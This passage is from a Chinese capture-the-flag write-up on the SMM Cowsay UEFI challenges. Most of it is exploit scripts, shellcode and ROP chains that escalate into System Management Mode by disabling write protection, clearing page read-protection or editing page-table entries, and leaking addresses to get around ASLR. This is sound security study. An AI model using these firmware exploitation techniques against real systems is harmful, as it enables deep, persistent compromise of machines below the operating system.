        EFI_SIMPLE_TEXT_INPUT_PROTOCOL * ConIn;  /*    48     8 */
        EFI_HANDLE         ConsoleOutHandle;     /*    56     8 */
        /* --- cacheline 1 boundary (64 bytes) --- */
        EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL * ConOut; /*    64     8 */
        EFI_HANDLE         StandardErrorHandle;  /*    72     8 */
        EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL * StdErr; /*    80     8 */
        EFI_RUNTIME_SERVICES * RuntimeServices;  /*    88     8 */
        EFI_BOOT_SERVICES * BootServices;        /*    96     8 */
        UINTN              NumberOfTableEntries; /*   104     8 */
        EFI_CONFIGURATION_TABLE * ConfigurationTable; /*   112     8 */

        /* size: 120, cachelines: 2, members: 13 */
        /* sum members: 116, holes: 1, sum holes: 4 */
        /* last cacheline: 56 bytes */
} EFI_SYSTEM_TABLE;
```
2. BootServices 中有我们写 Shellcode 会用到的绝大部分函数，包括 LocateProtocol 和 AllocatePool：
![[static/UEFT-image1.png]]
3. 还需要获取两个 GUID 用于定位函数，分别为：
	- gEfiSmmCowsayCommunicationGuid
	- gEfiSmmCommunicationProtocolGuid
	前者可以从 patch 中获得，后者可以从 edk2 源码获得：
	
> [!info] 
> `MdePkg/MdePkg.dec` 是 EDK2 核心包的描述文件，即 Package Declaration File，包含了 `UEFI/PI` 标准定义的许多通用库、协议、GUID 等，是 EDK2 最基础的核心包。几乎所有 EDK2 模块都需要依赖 MdePkg 包。

这里提供一个简易转换脚本：

```python
res_dict = {}
line = "gEfiSmmCommunicationProtocolGuid  = { 0xc68ed8e2, 0x9dc6, 0x4cbd, { 0x9d, 0x94, 0xdb, 0x65, 0xac, 0xc5, 0xc3, 0x32 }}"
data = line.split("=")
if len(data) == 2:
    temp_name = data[0].strip()
    temp_guid = data[1].strip().replace("{", "").replace("}", "").strip().split(",")
    cur_guid = ""
    if len(temp_guid) == 11:
        for i in range(len(temp_guid)):
            temp_bits = temp_guid[0 - i - 1]
            if 0 <= i and i < 8:
                cur_guid += hex(int(temp_bits, 16))[2:].rjust(2, "0")
            elif 8 <= i and i < 10:
                cur_guid += hex(int(temp_bits, 16))[2:].rjust(4, "0")
            elif 10 <= i:
                cur_guid += hex(int(temp_bits, 16))[2:].rjust(8, "0")
res_dict[temp_name] = "0x" + cur_guid
print(res_dict)
```

综合上面得到的信息，跟着 Patch 不难写出 AllocatePool 与拷贝数据的汇编代码：

```python
gEfiSmmCowsayCommunicationGuid = 0xF79265547535A8B54D102C839A75CF12
gEfiSmmCommunicationProtocolGuid = 0x32C3C5AC65DB949D4CBD9DC6C68ED8E2

lianpwn.lg_inf("STEP 1: AllocatePool and Setup Buffer")
regs = execute_shellcode(
    asm(f"""
    // Get Addresses
    mov r15, [{SystemTable_addr + 0x60}]; // BootServices
    mov r14, [r15 + 0x40]; // AllocatePool
    mov r13, [r15 + 0x140]; // LocateProtocol

    ret;
""")
)
BootServices_addr = regs[14]
AllocatePool_addr = regs[13]
LocateProtocol_addr = regs[12]
lianpwn.lg_suc("BootServices_addr", BootServices_addr)
lianpwn.lg_suc("AllocatePool_addr", AllocatePool_addr)
lianpwn.lg_suc("LocateProtocol_addr", LocateProtocol_addr)

allocated_buf = execute_shellcode(
    asm(f"""
    // AllocatePool(EfiRuntimeServicesData, 0x1000, &buffer);
    mov rcx, 6;
    mov rdx, 0x1000;
    lea r8, [rip + allocated_buf];
    mov rax, {AllocatePool_addr};
    call rax;

    // copy data to allocated_buf
    mov rdi, [rip + allocated_buf];
    lea rsi, [rip + temp_buf];
    mov rcx, 0x20;
    cld; // clear flags
    rep movsb; // mov $rcx bytes from $rsi to $rdi

    mov r15, [rip + allocated_buf];
    ret; // don't forget to return to Binexec.efi

temp_buf:
    .octa {gEfiSmmCowsayCommunicationGuid};
    .quad 0x100;
    .quad 0x44440000;

allocated_buf:
""")
)[14]
lianpwn.lg("allocated_buf", allocated_buf)
```
#### STEP 2: Access 0x44440000 with SmmCommunication

在上面代码的基础上，现在已经获得了布置好的 Buffer，调用 `mSmmCommunication->Communicate` 即可获得 flag：

```python
lianpwn.lg_inf("STEP 2: Access 0x44440000 with SmmCommunication")
execute_shellcode(
    asm(f"""
    // LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, mSmmCommunication)
    lea rcx, [rip + guid_buf];
    xor rdx, rdx;
    lea r8, [rip + temp_buf];
    mov rax, {LocateProtocol_addr};
    call rax;

    // mSmmCommunication->Communicate(this, Buffer, NULL);
    mov rcx, [rip + temp_buf];
    mov rdx, {allocated_buf};
    xor r8, r8;
    mov rax, [rip + temp_buf];
    mov rax, [rax];
    call rax;

    ret;

guid_buf:
    .octa {gEfiSmmCommunicationProtocolGuid};

temp_buf:
"""),
    cowsay=True,
)
```

需要注意的是由于 Cowsay 接受的参数为 UTF-16LE，故需要错位到 `0x44440001` 再打印一次才能获得完整 flag：
![[static/UEFI-image2.png]]

---
## SMM Cowsay 2

在第一问到帮助下我们已经了解了 UEFI ring 0 权限下怎么通过 SMM 驱动与 ring -2 权限（即 SMM mode）交互，接下来进入真正的 PWN 环节：在第二问中我们需要用栈迁移 + ROP 劫持控制流、篡改页表项，最终实现读取 flag。
### Analysis

首先还是分析 patches 目录下的文件，可以发现相较于上一问，改动主要出现在：

1. **`0003-SmmCowsay-Vulnerable-Cowsay.patch`**：
	- 修补了任意传入指针的漏洞，却改用 `mDebugData` 作为全局变量储存消息与函数指针（这或许也对应了题目描述中的「_a backdoor disguised as debugging code_」）：
	```c
	struct {
	  CHAR16 Message[200];
	  VOID EFIAPI (* volatile CowsayFunc)(IN CONST CHAR16 *Message, IN UINTN MessageLen);
	  BOOLEAN volatile Icebp;
	  UINT64 volatile Canary;
	} mDebugData;
	```
	- 使用 `SmmCopyMemToSmram` 将用户数据复制到 `mDebugData.Message`，但数据内容和长度都是自定义的，结构体中的 Canary 无法保护函数指针：
	![[static/UEFI-image3.png]]
2. **`0005-PiSmmCpuDxeSmm-Protect-flag-addresses.patch`**：
	- 上一问中不存在任何内存权限上的保护，但是这里不仅重新引入了保护和分页，还将 `0x44440000` 标记为不可读（`EFI_MEMORY_RP` 即 ReadProtect，读保护）：
	![[static/UEFI-image4.png]]

这一问的条件无疑比第一问苛刻了不少：即使能覆写 Cowsay 函数指针，那也只能劫持控制流 call 一次某个地址，更何况 0x44440000 的地址还有读保护，意味着劫持控制流后至少需要去掉分页（PE）或者该篡改页表项去掉 RP 标志位。

这里无疑是没有 `one_gadget` 来实现「一键 getflag」的。和常规 PWN 一样，下一个选择就是考虑**栈迁移**。
### ROP

首先需要选择合适的 gadget 来迁移栈，其中要求 gadget 位于 SMRAM 的地址范围内，可以在启动时加上参数 `-global isa-debugcon.iobase=0x402 -debugcon file:debug.log` 在当前目录下生成 debug.log（其中 0x402 是 OVMF 在调试模式下构建后默认的日志消息输出 IO 端口，release 版本则不会输出调试消息），在 debug.log 中可以定位到 SMRAM 的基地址与不同驱动加载的基地址：

```c
// ...
CPU[000]  APIC ID=0000  SMBASE=07FAF000  SaveState=07FBEC00  Size=00000400
// ...
Loading SMM driver at 0x00007FBF000 EntryPoint=0x00007FCC246 PiSmmCpuDxeSmm.efi
// ...
Loading SMM driver at 0x00007EE7000 EntryPoint=0x00007EE9D0F SmmCowsay.efi
// ...
```

对应地可以到 `edk2_artifacts` 目录下查看对应二进制文件及其调试信息，名字带有 Smm 的驱动里的 gadget 都是可用的。

那又回到最初的问题：如何栈迁移？事实上有非常多 gadget 可以实现这一步，但是可以找到一个最适用的 gadget：[`MdePkg/Library/BaseLib/X64/LongJump.nasm`](https://github.com/tianocore/edk2/blob/86c8d69146310f24069701053a27153ae536ebba/MdePkg/Library/BaseLib/X64/LongJump.nasm#L54)
```c
    mov     rbx, [rcx]
    mov     rsp, [rcx + 8]
    mov     rbp, [rcx + 0x10]
    mov     rdi, [rcx + 0x18]
    mov     rsi, [rcx + 0x20]
    mov     r12, [rcx + 0x28]
    mov     r13, [rcx + 0x30]
    mov     r14, [rcx + 0x38]
    mov     r15, [rcx + 0x40]
    // ...
    jmp     qword [rcx + 0x48]
```
它可以用第一个参数指向的内存上的信息设置好 rsp 与其它寄存器，再跳转到目标地址上，简直是完美的栈迁移 gadget。还有一点是 `LongJump.nasm` 在 MdePkg 的 BaseLib 中提供的实现，常用于某些错误处理或清理工作中，直接跳回到一个已知的稳定状态（如错误恢复点），属于核心库的一部分，因此大部分驱动里都会带有这个 gadget。

接下来可以尝试把断点下在 `LongJump_gadget` 上（_常见工具如 ropper 默认情况下可能找不到这个 gadget，对于这种小型 elf 我个人喜欢直接用 `objdump -d <filename> | nvim` 来找_），目前利用代码如下：

```python
# ...
lianpwn.lg_inf("STEP 1: AllocatePool")
allocated_buf = execute_shellcode(
    asm(f"""
    // AllocatePool(EfiRuntimeServicesData, 0x1000, &buffer);
    mov rcx, 6;
    mov rdx, 0x1000;
    lea r8, [rip + allocated_buf];
    mov rax, {AllocatePool_addr};
    call rax;

    mov r15, [rip + allocated_buf];
    ret;
 
allocated_buf:
""")
)[14]
lianpwn.lg("allocated_buf", allocated_buf)

lianpwn.lg_inf("STEP 2: Construct ROP - Stack Pivoting")

SmmCowsay_base = 0x00007EE7000
longjump_gadget = SmmCowsay_base + 0x34B0

payload = flat(
    {
        0x00: [
            0xBBBBBBBB,  # rbx
            allocated_buf + 0x18 + 0x48 + 0x8,  # after ( (guid + size) + 0x48 + 8)
        ],
        0x48: [
            0xDEADBEEF,
        ],
        400: [longjump_gadget],
    },
    word_size=64,
)


lianpwn.lg_inf("STEP ?: Finally - Send ROP Payload and Trigger Vuln")

execute_shellcode(
    asm(f"""
    // copy data to allocated_buf
    mov rdi, {allocated_buf};
    lea rsi, [rip + temp_buf];
    mov rcx, {len(payload) + 0x18};
    cld; // clear flags
    rep movsb; // mov $rcx bytes from $rsi to $rdi
 
    ret; // don't forget to return to Binexec.efi
 
temp_buf:
    .octa {gEfiSmmCowsayCommunicationGuid};
    .quad {len(payload)};
""")
    + payload
)

lianpwn.lg("breakpoint", longjump_gadget)
lianpwn.debugB()

execute_shellcode(
    asm(
        f"""
    // LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, mSmmCommunication)
    lea rcx, [rip + guid_buf];
    xor rdx, rdx;
    lea r8, [rip + temp_buf];
    mov rax, {LocateProtocol_addr};
    call rax;
 
    // mSmmCommunication->Communicate(this, Buffer, NULL);
    mov rcx, [rip + temp_buf];
    mov rdx, {allocated_buf};
    xor r8, r8;
    mov rax, [rip + temp_buf];
    mov rax, [rax];
    call rax;
 
    ret;
 
guid_buf:
    .octa {gEfiSmmCommunicationProtocolGuid};
 
temp_buf:
"""
    ),
    cowsay=True,
)

ia()
```

可以看到断点成功断下并且可以跳转到 `0xDEADBEEF` 处，证明偏移量计算无误：
![[static/UEFI-image5.png]]
### Defeat WP and RP

可以在 gdb 中再探索一下当前拥有的权限：

```bash
pwndbg> i r cr0
cr0            0x80010033          [ PG WP NE ET MP PE ]
```

> [!note] 
> 在当前的 CR0 设置中，开启的保护包括：
> - **分页机制 (PG)**，允许虚拟内存管理。
> - **写保护 (WP)**，保护内存页面免于非法写入，增强安全性。
> - **保护模式 (PE)**，提供内存段保护和权限分级。
>
> 在 x86 架构中，CR0 寄存器的 `WP` 位直接控制写保护（WriteProtect），而读保护（ReadProtect）通常不是由 CR0 直接控制。
>
> 读取访问的保护通常是通过页表中的权限位来控制的，这些位定义哪些进程可以读取特定的内存页。例如，页表中的某些位可以设置成允许或禁止用户模式的代码读取特定的内存页面。

写保护可以直接把 cr0 的第 16 位设置为 0 来绕过，接下来就可以随意篡改页表项或者代码段了，前者可以完成后续利用而后者可以往代码段写入 shellcode（NX 保护与 EFER 寄存器、页表项有关）：

```python
pop_rax_rdi_ret,
0x80000032,
0,
mov_cr0_rax_ret,
```

读保护也与页表项的标志位有关，单纯的禁用 PE 也无法绕开对 `0x44440000` 的 RP，必须要关闭 paging 才能访问到目标地址，但是我用这个方法没有找到合适的办法输出 flag（可以侧信道，不过非常费时）。
#### Exploitation 1 - SmmClearMemoryAttributes

因此单独对 CR0 寄存器进行篡改还不足以获得 flag，重新观察 `0005-PiSmmCpuDxeSmm-Protect-flag-addresses.patch` 可以注意到出题人在 `/UefiCpuPkg/PiSmmCpuDxeSmm/SmmCpuMemoryManagement.c` 文件中修改页面属性时调用的函数为 `SmmSetMemoryAttributes`，而这个文件会被编译到 PiSmmCpuDxeSmm.efi，其中函数同样可以被 SMM 模式下的 ROP 链调用，不过它通常不被用来清除已有的页面属性，相应的有 SmmClearMemoryAttributes 来完成我们的目标：

```c
EFI_STATUS
SmmClearMemoryAttributes (
  IN  EFI_PHYSICAL_ADDRESS  BaseAddress,
  IN  UINT64                Length,
  IN  UINT64                Attributes
  );
```

通过调试信息可以定位到该函数偏移为 0x7743，因此构造如下 ROP 链即可完成利用（其中可以在源码中找到 `#define EFI_MEMORY_RP  0x0000000000002000ULL`）：

```python
payload = flat(
    {
        0x00: [
            0xBBBBBBBB,  # rbx
            allocated_buf + 0x18 + 0x48 + 0x8,  # after ( (guid + size) + 0x48 + 8)
        ],
        0x48: [
            # disable WP
            pop_rax_rdi_ret,
            0x80000032,
            0,
            mov_cr0_rax_ret,
            # SmmClearMemoryAttributes(0x44440000, 0x1000, EFI_MEMORY_RP);
            pop_rdx_rcx_rbx,
            0x1000,
            0x44440000,
            0x00,
            control_r8,
            0x2000,
            0,
            0,
            SmmClearMemoryAttributes_addr,
            # Cowsay(0x44440000, 0x50);
            pop_rdx_rcx_rbx,
            0x50,
            0x44440000,
            0x00,
            Cowsay_addr,
        ],
        400: [longjump_gadget],
    },
    word_size=64,
)
```
#### Exploitation 2 - Modify PTE

换种思路：若没有发现 SmmClearMemoryAttributes 函数，也可以通过篡改 0x44440000 页面对应的页表条目，使 P 位为 1（代表页面存在、可读）。

为了简化后续操作，关闭 WP 保护后可以考虑写入 shellcode：

```python
smm_shellcode = asm(f"""
    ret;
""")
smm_shellcode = smm_shellcode.ljust(((len(smm_shellcode) // 8) + 1) * 8, b"\x90")

payload = flat(
    {
        0x00: [
            0xBBBBBBBB,  # rbx
            allocated_buf + 0x18 + 0x48 + 0x8,  # after ( (guid + size) + 0x48 + 8)
        ],
        0x48: [
            # disable WP
            pop_rax_rdi_ret,
            0x80000032,
            0,
            mov_cr0_rax_ret,
        ],
    },
    word_size=64,
)

for i in range((len(smm_shellcode) // 8)):
    payload += flat(
        [
            pop_rax_rdi_ret,
            u64_ex(smm_shellcode[i * 8 : (i + 1) * 8]),
            0,
            pop_rdx_rcx_rbx + 1,
            PiSmmCpuDxeSmm_addr + 0x1000 + (i) * 8,
            0,
            mov_ptrcx_rax_ret,
        ],
        word_size=64,
    )
payload += p64(PiSmmCpuDxeSmm_addr + 0x1000)
payload = payload.ljust(400, b"\x90") + p64(longjump_gadget)
```

最后一个难点就是页表条目的定位：

> [!info] 
> 在 x86-64 架构中，使用的是四级页表，这包括PML4（Page Map Level 4）、PDPT（Page Directory Pointer Table）、PDT（Page Directory Table）、和PT（Page Table），我们的目的是定位特定虚拟地址（在题目中是 0x44440000）的页表项（Page Table Entry, PTE），并修改其属性以用于绕过内存保护机制。 
> 
> 对于采用四级页表时的虚拟地址，0-11 bits 用来表示页内偏移、12-20 bits 索引 PT、21-29 bits 索引 PDT、30-38 bits 索引 PDPT、39-47 bits 索引 PML4，而更高的位则为符号扩展（并用于标识内核的虚拟地址）。
> 
> 值得注意的是，PML4（Page Map Level 4）的基地址存在于 CR3 寄存器中，在 CPU 做地址转换时由 MMU 完成对 CR3 的访问、寻址。

下面的 shellcode 中实现了根据 CR3 找到 0x44440000 对应的页表项、修改 `P` 标志位、写回、调用 Cowsay 函数输出的功能，其中为了压缩 payload 长度花了不少力气（不能超过 400 字节，感觉这个限制略有一些麻烦，不过比赛中可以用 ud2 触发内存访问错误，借助错误 dump 输出 flag）：

```python
smm_shellcode = asm(f"""
    // mov rax, cr3;
    // mov rbx, 0xffffffff000; // 去除标志位，提取出页帧信息
    mov rax, [rax + {0x44440000 >> 39} * 8];
    and rax, rdi;
    mov rax, [rax + {(0x44440000 >> 30) & 0x1ff} * 8];
    and rax, rdi;
    mov rax, [rax + {(0x44440000 >> 21) & 0x1ff} * 8];
    and rax, rdi;
    mov rdi, rax;
    mov rax, [rax + {(0x44440000 >> 12) & 0x1ff} * 8];
    or al, 0x1; // Present flag
    mov [rdi + {(0x44440000 >> 12) & 0x1ff} * 8], rax;
    // push 0x44440000;
    // pop rcx;
    // push 0x8; pop rdx;
    // mov rax, {Cowsay_addr};
    call rbx;
""")
lianpwn.lg("len(smm_shellcode)", len(smm_shellcode))
smm_shellcode = smm_shellcode.ljust(((len(smm_shellcode) // 8) + 1) * 8, b"\x90")

payload = flat(
    {
        0x00: [
            pop_rax_rdi_ret + 1,  # rbx
            allocated_buf
            + 0x18
            + 0x48
            + 0x8
            - 0x38
            - 0x18,  # after ( (guid + size) + 0x48 + 8)
        ],
        0x48 - 0x38: [
            # disable WP
            pop_rax_rdi_ret,
            0x80000032,
            0,
            mov_cr0_rax_ret,
            pop_rdx_rcx_rbx + 2,
            VariableSmm_addr + 0x1000,
            pop_rax_rdi_ret + 1,
            pop_rax_rdi_ret + 2,
        ],
    },
    word_size=64,
)

for i in range((len(smm_shellcode) // 8)):
    payload += flat(
        [
            pop_rax_rdi_ret,
            u64_ex(smm_shellcode[i * 8 : (i + 1) * 8]),
            0xFFFFFFFF000,
            mov_ptrbx_rax_ret,
            VariableSmm_addr + 0x1000 + (i + 1) * 8,
        ],
        word_size=64,
    )
payload += (
    p64(mov_raxcr3_cr3rax)
    + p64(pop_rdx_rcx_rbx)
    + p64(0x50)
    + p64(0x44440000)
    + p64(Cowsay_addr)
)
payload += p64(VariableSmm_addr + 0x1000)
lianpwn.lg("len(payload)", len(payload))
payload = payload.ljust(400, b"\x90") + p64(longjump_gadget)
```

---
## SMM Cowsay 3

第三问又在第二问的基础上增加了 ASLR，不过刚刚在第二问中我已经尽量减少对固定地址的依赖。这一问就只需要先泄漏 SMM 范围内的地址即可。

第一步借助上面 guid 转换的 python 脚本，改一个遍历核心库 MdePkg 中 GUID 的脚本出来，目标是找到一个基地址位于 SMRAM 范围内的函数：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwn import *
import subprocess
import lianpwn

context.arch = "amd64"
context.log_level = "info"

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

file = open("MdeModulePkg.dec", "r")

res_dict = {}

for line in file.readlines():
    if "Guid" in line:
        if "=" in line:
            data = line.split("=")
            if len(data) == 2:
                temp_name = data[0].strip()
                temp_guid = (
                    data[1].strip().replace("{", "").replace("}", "").strip().split(",")
                )
                cur_guid = ""
                if len(temp_guid) == 11:
                    for i in range(len(temp_guid)):
                        temp_bits = temp_guid[0 - i - 1]
                        if 0 <= i and i < 8:
                            cur_guid += hex(int(temp_bits, 16))[2:].rjust(2, "0")
                        elif 8 <= i and i < 10:
                            cur_guid += hex(int(temp_bits, 16))[2:].rjust(4, "0")
                        elif 10 <= i:
                            cur_guid += hex(int(temp_bits, 16))[2:].rjust(8, "0")
            res_dict[temp_name] = "0x" + cur_guid


def dump_register(reg_list):
    assert len(reg_list) == 15
    for i in range(15):
        lianpwn.info(f"reg[{i}] -> {hex(reg_list[i])}")


def execute_shellcode(shellcode, cowsay=False):
    result = []
    shellcode = shellcode.hex().encode()
    s(shellcode + b"\r\n" + b"done\r\n")
    ru(b"Running...\r\n")
    if cowsay:
        ru(b"< ")
        return ru(b" >", "drop")
    for i in range(14):
        ru(b": 0x")
        result.append(int(ru(b"R", "drop"), 16))
    ru(b": 0x")
    result.append(int(ru(b"Done! Type more code\r\n", "drop"), 16))
    # dump_register(result)
    return result


for guid_name, guid_value in res_dict.items():
    if not "Smm" in guid_name:
        continue
    fname = "OVMF_VARS_copy.fd"
    subprocess.call(["cp", "OVMF_VARS.fd", fname])
    subprocess.call(["chmod", "u+w", fname])

    io = process(
        "./qemu-system-x86_64 -d cpu_reset -no-reboot -machine q35,smm=on -cpu max -net none -serial stdio -display none -vga none -global ICH9-LPC.disable_s3=1 -global driver=cfi.pflash01,property=secure,value=on -drive if=pflash,format=raw,unit=0,file=OVMF_CODE.fd,readonly=on -drive if=pflash,format=raw,unit=1,file=OVMF_VARS_copy.fd -drive format=raw,file=fat:rw:rootfs -global isa-debugcon.iobase=0x402 -debugcon file:debug.log".split(),
        env={},
    )

    # lianpwn.lg_inf(
    #     "STEP 0: Receive SystemTable and shellcode Address and Attach to Debugger"
    # )
    ru(b"Address of SystemTable: 0x")
    SystemTable_addr = int(rl(), 16)
    ru(b"Address where I'm gonna run your code: 0x")
    shellcode_addr = int(rl(), 16)
    # lg("SystemTable_addr", SystemTable_addr)
    # lg("shellcode_addr", shellcode_addr)

    # lianpwn.lg_inf("STEP 1: Defeat ASLR and Locate Funcs")

    result = execute_shellcode(
        asm(f"""
        // locate BootServices, LocateProtocol, AllocatePool
        mov r15, [{SystemTable_addr + 0x60}];
        mov r14, [r15 + 0x140]; // LocateProtocol
        mov r13, [r15 + 0x40];  // AllocatePool
    """)
    )
    AllocatePool_addr = result[12]
    LocateProtocol_addr = result[13]
    BootServices_addr = result[14]
    # lianpwn.lg_suc("AllocatePool_addr", AllocatePool_addr)
    # lianpwn.lg_suc("LocateProtocol_addr", LocateProtocol_addr)
    # lianpwn.lg_suc("BootServices_addr", BootServices_addr)

    tmp_buf = shellcode_addr + 0x400
    result = execute_shellcode(
        asm(f"""
        // LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, mSmmCommunication)
        lea rcx, [rip + data];
        xor rdx, rdx;
        lea r8, [rip + buf_temp];
        mov rax, {LocateProtocol_addr};
        call rax;

        lea r15, [rip + buf_temp];
        mov r14, [r15];
        mov r13, [r14];

        ret;

    data:
        .octa {guid_value};
    buf_temp:
    """)
    )
    # lianpwn.lg(f"{guid_name}", int(guid_value, 16))
    if result[0] == 0:
        import re

        smbase_pattern = re.compile(r"SMBASE=([0-9A-F]+)")
        match = smbase_pattern.search(open("./debug.log", "r").read())
        smbase_value = match.group(1)
        # if result[13] < 0x07000000:
        #     continue
        # import re
        #
        lianpwn.lg("result[13]", result[13])
        lianpwn.lg("result[14]", result[14])
        lianpwn.lg(f"{guid_name}", int(guid_value, 16))
        lianpwn.lg("SMBASE", int(smbase_value, 16))
        # smbase_pattern = re.compile(
        #     r"Loading SMM driver at 0x([0-9A-F]+) EntryPoint=0x([0-9A-F]+) PiSmmCpuDxeSmm.efi"
        # )
        # match = smbase_pattern.search(open("./debug.log", "r").read())
        # smbase_value = int(match.group(1), 16)
        # lianpwn.lg_suc("offset", result[13] - smbase_value)
        subprocess.run("rm ./debug.log".split())
        # offset --> 0x16210
    io.close()
```

爆破下来只有 `gEfiSmmConfigurationProtocolGuid` 函数满足要求，位于驱动 `PiSmmCpuDxeSmm.efi` 中：
![[static/UEFI-image6.png]]

所幸上面用到的大部分 gadget 都可以在 `PiSmmCpuDxeSmm` 驱动中找到，包括 longjump、SmmClearMemoryAttributes 等。

接下来的利用思路就还是 ROP，因为找取指针的寄存器很麻烦，最后就转换成 Shellcode，借助 dump 或者逐位时间侧信道都可以获得 flag：

![[static/UEFI-image7.png]]
### Exploitation

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwn import *
import subprocess
import lianpwn

context.arch = "amd64"
context.log_level = "info"

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))

fname = "OVMF_VARS_copy.fd"
subprocess.call(["cp", "OVMF_VARS.fd", fname])
subprocess.call(["chmod", "u+w", fname])


def debug_with_addr():
    lg("SystemTable_addr", SystemTable_addr)
    lg("shellcode_addr", shellcode_addr)
    lianpwn.lg_suc("smm_buf_addr", smm_buf_addr)
    lianpwn.lg_suc("loong_jump_gadget", loong_jump_gadget)
    lianpwn.lg_suc("PiSmmCpuDxeSmm_base + 0x1000", PiSmmCpuDxeSmm_base + 0x1000)
    lianpwn.debugB()


io = process(
    "./qemu-system-x86_64 -d cpu_reset -no-reboot -machine q35,smm=on -cpu max -net none -serial stdio -display none -vga none -global ICH9-LPC.disable_s3=1 -global driver=cfi.pflash01,property=secure,value=on -drive if=pflash,format=raw,unit=0,file=OVMF_CODE.fd,readonly=on -drive if=pflash,format=raw,unit=1,file=OVMF_VARS_copy.fd -drive format=raw,file=fat:rw:rootfs -global isa-debugcon.iobase=0x402 -debugcon file:debug.log -s".split(),
    env={},
)

lianpwn.lg_inf(
    "STEP 0: Receive SystemTable and shellcode Address and Attach to Debugger"
)
ru(b"Address of SystemTable: 0x")
SystemTable_addr = int(rl(), 16)
ru(b"Address where I'm gonna run your code: 0x")
shellcode_addr = int(rl(), 16)

lianpwn.lg_inf("STEP 1: Defeat ASLR and Locate Funcs")


def dump_register(reg_list):
    assert len(reg_list) == 15
    for i in range(15):
        lianpwn.info(f"reg[{i}] -> {hex(reg_list[i])}")


def execute_shellcode(shellcode, cowsay=False):
    result = []
    shellcode = shellcode.hex().encode()
    s(shellcode + b"\r\n" + b"done\r\n")
    ru(b"Running...\r\n")
    if cowsay:
        ru(b"< ")
        return ru(b" >", "drop")
    for i in range(14):
        ru(b": 0x")
        result.append(int(ru(b"R", "drop"), 16))
    ru(b": 0x")
    result.append(int(ru(b"Done! Type more code\r\n", "drop"), 16))
    dump_register(result)
    return result


result = execute_shellcode(
    asm(f"""
    // locate BootServices, LocateProtocol, AllocatePool
    mov r15, [{SystemTable_addr + 0x60}];
    mov r14, [r15 + 0x140]; // LocateProtocol
    mov r13, [r15 + 0x40];  // AllocatePool
""")
)
AllocatePool_addr = result[12]
LocateProtocol_addr = result[13]
BootServices_addr = result[14]
lianpwn.lg_suc("AllocatePool_addr", AllocatePool_addr)
lianpwn.lg_suc("LocateProtocol_addr", LocateProtocol_addr)
lianpwn.lg_suc("BootServices_addr", BootServices_addr)

# result[13] --> 0x77f5210
# result[14] --> 0x4bd31b8
# gEfiSmmConfigurationProtocolGuid --> 0xa74bdad78bbef080492eb68926eeb3de
# SMBASE --> 0x778b000
test_guid = 0xA74BDAD78BBEF080492EB68926EEB3DE
tmp_buf = shellcode_addr + 0x400
result = execute_shellcode(
    asm(f"""
    // LocateProtocol(test_guid, NULL, &buf)
    lea rcx, [rip + data];
    xor rdx, rdx;
    lea r8, [rip + buf_temp];
    mov rax, {LocateProtocol_addr};
    call rax;

    lea r15, [rip + buf_temp];
    mov r14, [r15];
    mov r13, [r14];

    ret;
data:
    .octa {test_guid};
buf_temp:
""")
)
offset = 0x16210
PiSmmCpuDxeSmm_base = result[13] - offset
lianpwn.lg_suc("PiSmmCpuDxeSmm_base", PiSmmCpuDxeSmm_base)

result = execute_shellcode(
    asm(f"""
    // AllocatePool(EfiRuntimeServicesData, 0x1000, &buffer);
    mov rcx, 6;
    mov rdx, 0x1000;
    mov r8, {tmp_buf};
    mov rax, {AllocatePool_addr};
    call rax;

    mov r15, [{tmp_buf}];
""")
)
smm_buf_addr = result[14]


lianpwn.lg_inf("STEP 2: Construct ROP")
"""
108f0: mov    rbx,QWORD PTR [rcx]
108f3: mov    rsp,QWORD PTR [rcx+0x8]
108f7: mov    rbp,QWORD PTR [rcx+0x10]
108fb: mov    rdi,QWORD PTR [rcx+0x18]
108ff: mov    rsi,QWORD PTR [rcx+0x20]
10903: mov    r12,QWORD PTR [rcx+0x28]
10907: mov    r13,QWORD PTR [rcx+0x30]
1090b: mov    r14,QWORD PTR [rcx+0x38]
1090f: mov    r15,QWORD PTR [rcx+0x40]
10913: ldmxcsr DWORD PTR [rcx+0x50]
10917: movdqu xmm6,XMMWORD PTR [rcx+0x58]
1091c: movdqu xmm7,XMMWORD PTR [rcx+0x68]
10921: movdqu xmm8,XMMWORD PTR [rcx+0x78]
10927: movdqu xmm9,XMMWORD PTR [rcx+0x88]
1092e:
10930: movdqu xmm10,XMMWORD PTR [rcx+0x98]
10937:
10939: movdqu xmm11,XMMWORD PTR [rcx+0xa8]
10940:
10942: movdqu xmm12,XMMWORD PTR [rcx+0xb8]
10949:
1094b: movdqu xmm13,XMMWORD PTR [rcx+0xc8]
10952:
10954: movdqu xmm14,XMMWORD PTR [rcx+0xd8]
1095b:
1095d: movdqu xmm15,XMMWORD PTR [rcx+0xe8]
10964:
10966: mov    rax,rdx
10969: jmp    QWORD PTR [rcx+0x48]
"""
